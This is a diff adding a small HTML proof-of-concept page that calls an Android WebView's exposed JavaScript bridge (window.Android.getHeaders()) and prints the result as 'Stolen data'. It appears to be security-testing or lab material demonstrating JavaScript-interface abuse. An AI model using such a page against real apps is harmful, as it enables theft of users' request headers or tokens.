@@ -1,0 +1,15 @@
+<!DOCTYPE html>
+<html>
+<head><title>Subu</title></head>
+<body style="text-align: center;">
+    <script type="text/javascript">
+        var data;
+        if(window.Android) { // Android
+            data = window.Android.getHeaders();
+        }
+        if(data) {
+            document.write("Stolen data: " + data);
+        }
+    </script>
+</body>
+</html>
